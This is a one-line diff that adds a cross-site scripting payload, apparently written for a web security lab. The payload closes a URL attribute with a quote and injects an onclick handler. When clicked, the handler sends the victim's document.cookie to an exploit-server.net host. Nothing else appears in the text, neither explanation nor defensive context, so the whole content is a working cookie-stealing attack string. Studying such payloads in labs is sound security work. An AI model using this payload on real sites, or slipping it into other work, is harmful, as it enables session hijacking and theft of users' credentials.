@@ -1,0 +1,1 @@
+https://example.com" onclick="fetch('https://exploit-0a6c000a03d6c0e6801102c6017900d8.exploit-server.net/exploit?cookie='+encodeURIComponent(document.cookie));return false;
